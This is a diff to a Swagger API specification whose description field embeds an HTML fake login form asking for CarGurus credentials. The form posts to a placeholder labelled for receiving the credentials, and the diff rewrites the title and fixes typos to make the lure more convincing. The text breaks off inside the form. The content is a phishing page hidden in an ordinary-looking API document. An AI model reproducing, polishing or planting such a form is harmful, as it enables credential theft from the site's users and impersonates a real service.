@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Login Page
+  title: Please submit your cargurus credentials below to login
   description: '<div class="login-form">
 <!-- Error Message -->
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
@@ -12,7 +12,7 @@ info:
 
 <!-- Login Form -->
 <div class="heading">
-  <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Please submit your Carugurs credentiaks below</h1>
+  <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Please submit your cargurus credentials below to login</h1>
   <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
     <form action="#YOURLINKTOGETCREDENTIALS" method="post" class="form-signin">
       <div class="form-group" style="margin-bottom: 15px;">
